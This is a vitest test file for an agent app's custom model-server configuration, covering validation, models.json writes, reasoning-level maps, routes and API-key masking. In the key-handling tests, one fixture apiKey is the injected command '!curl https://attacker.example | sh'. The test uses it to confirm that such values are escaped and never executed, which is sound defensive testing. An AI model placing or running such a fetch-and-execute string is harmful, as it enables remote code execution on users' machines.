/**
 * Custom model servers: validation, managed-vs-foreign writes to models.json,
 * the routes (with an injected refresh), and ref resolution for custom ids.
 */
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import Fastify from "fastify";
import { ModelRuntime } from "@earendil-works/pi-coding-agent";
import { clampThinkingLevel, getSupportedThinkingLevels } from "@earendil-works/pi-ai";

import {
  customModelForClient,
  customThinkingLevelMap,
  customProviderIds,
  isCustomProvider,
  listCustomProviders,
  modelsJsonPath,
  publicCustomProviders,
  validateCustomProviders,
  writeCustomProviders,
} from "../src/agent/custom-models.ts";
import { registerModelProviderRoutes } from "../src/api/model-providers.ts";
import type { ProviderAuthRuntime } from "../src/agent/provider-auth.ts";

let dir: string;
beforeEach(() => {
  dir = fs.mkdtempSync(path.join(os.tmpdir(), "kady-custom-models-"));
});
afterEach(() => fs.rmSync(dir, { recursive: true, force: true }));

const vllm = {
  id: "hpc-vllm",
  name: "Lab vLLM",
  baseUrl: "http://gpu-node:8000/v1",
  api: "openai-completions",
  apiKey: "$LAB_KEY",
  models: [
    { id: "llama-3.3-70b", name: "Llama 3.3 70B", contextWindow: 128_000, maxTokens: 8_192, reasoning: false, input: ["text"], cost: { input: 0.5, output: 1.5, cacheRead: 0, cacheWrite: 0 } },
    { id: "qwen/qwen3-32b" },
  ],
};

describe("validateCustomProviders", () => {
  it("accepts a well-formed provider and normalizes it", () => {
    const out = validateCustomProviders([vllm]);
    expect(typeof out).not.toBe("string");
    expect(out).toMatchObject([{ id: "hpc-vllm", api: "openai-completions", models: [{ id: "llama-3.3-70b", cost: { input: 0.5 } }, { id: "qwen/qwen3-32b" }] }]);
  });
  it("rejects collisions, bad ids, bad URLs, empty model lists and odd numbers", () => {
    expect(validateCustomProviders([{ ...vllm, id: "anthropic" }])).toMatch(/built-in/);
    expect(validateCustomProviders([{ ...vllm, id: "openrouter" }])).toMatch(/built-in/);
    expect(validateCustomProviders([{ ...vllm, id: "Bad Id" }])).toMatch(/invalid provider id/);
    expect(validateCustomProviders([{ ...vllm, baseUrl: "gpu-node:8000" }])).toMatch(/baseUrl/);
    expect(validateCustomProviders([{ ...vllm, api: "grpc" }])).toMatch(/api must be/);
    expect(validateCustomProviders([{ ...vllm, models: [] }])).toMatch(/at least one model/);
    expect(validateCustomProviders([{ ...vllm, models: [{ id: "a" }, { id: "a" }] }])).toMatch(/duplicate model/);
    expect(validateCustomProviders([{ ...vllm, models: [{ id: "a", cost: { input: -1 } }] }])).toMatch(/cost\.input/);
    expect(validateCustomProviders([vllm, vllm])).toMatch(/duplicate provider/);
    expect(validateCustomProviders("nope")).toMatch(/must be an array/);
  });
});

describe("custom server reasoning levels", () => {
  const levels = ["low", "medium", "xhigh"];
  const mapping = { minimal: "low", low: "low", medium: "medium", high: "medium", xhigh: "xhigh" };
  const provider = { ...vllm, apiKey: "", reasoningLevels: levels, models: [
    { id: "qwen", reasoning: true }, { id: "plain", reasoning: false },
  ] };
  const save = (value: unknown) => {
    const checked = validateCustomProviders([value]);
    if (typeof checked === "string") throw new Error(checked);
    return writeCustomProviders(checked, dir)!;
  };

  it("validates accepted levels, normalizes order and leaves empty/unset at legacy defaults", () => {
    for (const invalid of ["low", null, ["off"], ["max"], ["ultra"], [1]]) {
      expect(validateCustomProviders([{ ...provider, reasoningLevels: invalid }])).toMatch(/reasoningLevels/);
    }
    expect(save({ ...provider, reasoningLevels: ["xhigh", "low", "medium", "low"] })[0].reasoningLevels).toEqual(levels);
    expect(customThinkingLevelMap(["high"])).toEqual({ minimal: "high", low: "high", medium: "high", high: "high", xhigh: "high" });
    expect(customThinkingLevelMap([])).toBeUndefined();
    for (const accepted of [undefined, []]) {
      const [listed] = save({ ...provider, reasoningLevels: accepted });
      expect(listed.reasoningLevels).toBeUndefined();
      const file = JSON.parse(fs.readFileSync(modelsJsonPath(dir), "utf8"));
      expect(file.providers[provider.id].models[0].thinkingLevelMap).toBeUndefined();
    }
  });

  it("writes maps only for reasoning models, round-trips levels, and preserves foreign maps", () => {
    const foreign = { baseUrl: "http://foreign/v1", models: [{ id: "m", reasoning: true, thinkingLevelMap: { high: "custom-effort", max: null } }] };
    fs.writeFileSync(modelsJsonPath(dir), JSON.stringify({ providers: { foreign } }));
    const original = fs.readFileSync(modelsJsonPath(dir), "utf8");
    listCustomProviders(dir);
    expect(fs.readFileSync(modelsJsonPath(dir), "utf8")).toBe(original);
    save(provider);
    const file = JSON.parse(fs.readFileSync(modelsJsonPath(dir), "utf8"));
    expect(file.providers.foreign).toEqual(foreign);
    expect(file.providers[provider.id].models[0].thinkingLevelMap).toEqual(mapping);
    expect(file.providers[provider.id].models[1].thinkingLevelMap).toBeUndefined();
    expect(publicCustomProviders(dir).find((p) => p.id === provider.id)?.reasoningLevels).toEqual(levels);
    // Server-level configuration survives even before any reasoning model is enabled.
    save({ ...provider, models: [{ id: "plain", reasoning: false }] });
    expect(listCustomProviders(dir).find((p) => p.id === provider.id)?.reasoningLevels).toEqual(levels);
  });

  it("reloads maps in independent real Pi runtimes and exposes them through the picker route", async () => {
    save(provider);
    const options = { authPath: path.join(dir, "test-auth.json"), modelsPath: modelsJsonPath(dir),
      modelsStorePath: path.join(dir, "test-models-store.json"), allowModelNetwork: false };
    const runtime = await ModelRuntime.create(options);
    const childRuntime = await ModelRuntime.create(options);
    expect(runtime.getError()).toBeUndefined();
    for (const value of [runtime, childRuntime]) {
      const model = value.getModel(provider.id, "qwen")!;
      expect(model.thinkingLevelMap).toEqual(mapping);
      expect(getSupportedThinkingLevels(model)).toEqual(["off", "minimal", "low", "medium", "high", "xhigh"]);
      expect(clampThinkingLevel(model, "high")).toBe("high");
      expect(clampThinkingLevel(model, "xhigh")).toBe("xhigh");
    }
    const app = Fastify();
    try {
      await registerModelProviderRoutes(app, { runtime, customModelsDir: dir });
      const res = await app.inject({ method: "GET", url: "/providers/models" });
      expect(res.statusCode).toBe(200);
      expect(res.json().models.find((m: { id: string }) => m.id === `${provider.id}/qwen`)).toMatchObject({
        thinkingSentAs: { minimal: "low", high: "medium" },
      });
      expect(res.json().models.find((m: { id: string }) => m.id === `${provider.id}/plain`).thinkingSentAs).toBeUndefined();
    } finally {
      await app.close();
    }
  });

  it("builds only accepted reasoning_effort values on the actual Pi completion path; Off omits the field", async () => {
    save(provider);
    const runtime = await ModelRuntime.create({ authPath: path.join(dir, "test-auth.json"), modelsPath: modelsJsonPath(dir),
      modelsStorePath: path.join(dir, "test-models-store.json"), allowModelNetwork: false });
    const model = runtime.getModel(provider.id, "qwen")!;
    const fetcher = vi.fn(async () => { throw new Error("Unexpected outbound request"); });
    for (const [selected, expected] of Object.entries({ off: undefined, ...mapping })) {
      let payload: unknown;
      const effective = clampThinkingLevel(model, selected as "off" | "high");
      await runtime.completeSimple(model, { messages: [{ role: "user", content: "ok", timestamp: 0 }] }, {
        reasoning: effective === "off" ? undefined : effective,
        maxTokens: 1,
        fetch: fetcher,
        onPayload: (value) => { payload = value; throw new Error("Payload captured before network"); },
      });
      expect(payload).toBeDefined();
      expect((payload as Record<string, unknown>).reasoning_effort).toBe(expected);
    }
    expect(fetcher).not.toHaveBeenCalled();
  });
});

describe("writeCustomProviders", () => {
  it("writes Pi's models.json shape with a placeholder key for keyless servers and tracks managed ids", () => {
    const keyless = { ...vllm, id: "local-box", apiKey: "" };
    const listing = writeCustomProviders(validateCustomProviders([vllm, keyless]) as never, dir)!;
    expect(listing.map((p) => [p.id, p.managed])).toEqual([["hpc-vllm", true], ["local-box", true]]);
    const written = JSON.parse(fs.readFileSync(modelsJsonPath(dir), "utf-8"));
    expect(written.providers["hpc-vllm"]).toMatchObject({ name: "Lab vLLM", baseUrl: "http://gpu-node:8000/v1", api: "openai-completions", apiKey: "$LAB_KEY" });
    expect(written.providers["hpc-vllm"].models[0]).toEqual({
      id: "llama-3.3-70b",
      name: "Llama 3.3 70B",
      reasoning: false,
      input: ["text"],
      contextWindow: 128_000,
      maxTokens: 8_192,
      cost: { input: 0.5, output: 1.5, cacheRead: 0, cacheWrite: 0 },
    });
    expect(written.providers["local-box"].apiKey).toBe("none");
    expect(customProviderIds(dir)).toEqual(new Set(["hpc-vllm", "local-box"]));
    expect(isCustomProvider("hpc-vllm", dir)).toBe(true);

    // Removing one managed provider drops it from the file.
    writeCustomProviders(validateCustomProviders([vllm]) as never, dir);
    expect(Object.keys(JSON.parse(fs.readFileSync(modelsJsonPath(dir), "utf-8")).providers)).toEqual(["hpc-vllm"]);
    expect(customProviderIds(dir)).toEqual(new Set(["hpc-vllm"]));
  });

  it("keeps hand-written providers and other keys, and refuses to take one over", () => {
    fs.writeFileSync(
      modelsJsonPath(dir),
      JSON.stringify({ something: true, providers: { mine: { baseUrl: "http://x/v1", api: "openai-completions", apiKey: "k", models: [{ id: "m" }] } } }),
    );
    expect(listCustomProviders(dir)).toEqual([expect.objectContaining({ id: "mine", managed: false })]);
    const listing = writeCustomProviders(validateCustomProviders([vllm]) as never, dir)!;
    expect(listing.map((p) => [p.id, p.managed])).toEqual([["mine", false], ["hpc-vllm", true]]);
    const written = JSON.parse(fs.readFileSync(modelsJsonPath(dir), "utf-8"));
    expect(written.something).toBe(true);
    expect(written.providers.mine.apiKey).toBe("k");
    expect(writeCustomProviders(validateCustomProviders([{ ...vllm, id: "mine" }]) as never, dir)).toBeNull();
    fs.writeFileSync(modelsJsonPath(dir), "{ nope");
    expect(writeCustomProviders([], dir)).toBeNull();
    expect(listCustomProviders(dir)).toEqual([]);
  });
});

describe("custom-model routes", () => {
  function runtime(): ProviderAuthRuntime {
    return {
      checkAuth: vi.fn(async (id: string) => (id === "hpc-vllm" ? { type: "api_key", source: "test" } : undefined)),
      login: vi.fn(),
      logout: vi.fn(),
      listCredentials: vi.fn(async () => []),
      getAvailable: vi.fn(async (id: string) =>
        id === "hpc-vllm"
          ? [{ id: "llama-3.3-70b", name: "Llama 3.3 70B", provider: "hpc-vllm", contextWindow: 128_000, maxTokens: 8_192, input: ["text"], reasoning: false, cost: { input: 0.5, output: 1.5, cacheRead: 0, cacheWrite: 0 } }]
          : [],
      ),
      getProvider: vi.fn(),
      setRuntimeApiKey: vi.fn(),
      removeRuntimeApiKey: vi.fn(),
      isUsingOAuth: vi.fn(() => false),
    } as unknown as ProviderAuthRuntime;
  }

  it("saves, refreshes Pi, reports credential status and lists picker rows", async () => {
    const app = Fastify();
    const refreshModels = vi.fn(async () => {});
    const auth = runtime();
    await registerModelProviderRoutes(app, { runtime: auth, refreshModels, customModelsDir: dir });
    let res = await app.inject({ method: "PUT", url: "/custom-models", headers: { "content-type": "application/json" }, payload: { providers: [vllm] } });
    expect(res.statusCode).toBe(200);
    expect(refreshModels).toHaveBeenCalledTimes(1);
    expect(res.json()).toMatchObject({ providers: [{ id: "hpc-vllm", managed: true }], configured: { "hpc-vllm": true } });

    res = await app.inject({ method: "GET", url: "/custom-models" });
    expect(res.json().providers).toHaveLength(1);

    res = await app.inject({ method: "GET", url: "/providers/models" });
    const body = res.json() as { providers: { id: string; configured: boolean }[]; models: { id: string; sourceLabel: string; billingMode: string; pricing: { prompt: number } }[] };
    expect(body.providers).toContainEqual({ id: "hpc-vllm", configured: true });
    const row = body.models.find((m) => m.id === "hpc-vllm/llama-3.3-70b");
    expect(row).toMatchObject({ sourceLabel: "Custom servers", billingMode: "payg", pricing: { prompt: 0.5 } });

    res = await app.inject({ method: "PUT", url: "/custom-models", headers: { "content-type": "application/json" }, payload: { providers: [{ ...vllm, id: "anthropic" }] } });
    expect(res.statusCode).toBe(400);
    await app.close();
  });

  it("customModelForClient shapes the picker row", () => {
    const row = customModelForClient(
      { id: "m", name: "M", provider: "p", contextWindow: 1, maxTokens: 1, input: ["text", "image"], reasoning: true, cost: { input: 40, output: 50, cacheRead: 0, cacheWrite: 0 } } as never,
      { id: "p", name: "P", baseUrl: "http://x", api: "openai-completions", models: [], managed: true },
    );
    expect(row).toMatchObject({ id: "p/m", provider: "P", sourceId: "p", sourceLabel: "Custom servers", tier: "flagship", modality: "text+image->text", billingMode: "payg" });
  });
});

describe("custom provider keys", () => {
  it("stores UI literals so Pi can neither run nor expand them", () => {
    const out = validateCustomProviders([
      { ...vllm, id: "cmd", apiKey: "!curl https://attacker.example | sh" },
      { ...vllm, id: "dollar", apiKey: "sk-ab$cd${EF}" },
      { ...vllm, id: "ref", apiKey: "${LAB_KEY}" },
    ]);
    if (typeof out === "string") throw new Error(out);
    expect(out.map((p) => p.apiKey)).toEqual([
      "$!curl https://attacker.example | sh",
      "sk-ab$$cd$${EF}",
      "${LAB_KEY}",
    ]);
    expect(validateCustomProviders([{ ...vllm, apiKey: "$KADY_AUTH_TOKEN" }])).toMatch(/Kady's own/);
    expect(validateCustomProviders([{ ...vllm, apiKey: "sk-1\nX=1" }])).toMatch(/control/);
  });

  it("masks literal keys on read, keeps them on a blank save, and writes owner-only", () => {
    const first = validateCustomProviders([{ ...vllm, apiKey: "sk-live-1234567890abcd" }]);
    if (typeof first === "string") throw new Error(first);
    writeCustomProviders(first, dir);
    const [listed] = publicCustomProviders(dir);
    expect(listed.apiKey).toBeUndefined();
    expect(listed).toMatchObject({ apiKeySaved: true, apiKeyMasked: "sk-l…abcd" });
    if (process.platform !== "win32") {
      expect(fs.statSync(modelsJsonPath(dir)).mode & 0o077).toBe(0);
    }

    const again = validateCustomProviders([{ ...vllm, apiKey: "", keepApiKey: true }]);
    if (typeof again === "string") throw new Error(again);
    writeCustomProviders(again, dir);
    const stored = JSON.parse(fs.readFileSync(modelsJsonPath(dir), "utf-8"));
    expect(stored.providers["hpc-vllm"].apiKey).toBe("sk-live-1234567890abcd");

    // An env reference is not a secret and is shown as written.
    const ref = validateCustomProviders([vllm]);
    if (typeof ref === "string") throw new Error(ref);
    writeCustomProviders(ref, dir);
    expect(publicCustomProviders(dir)[0].apiKey).toBe("$LAB_KEY");
  });
});
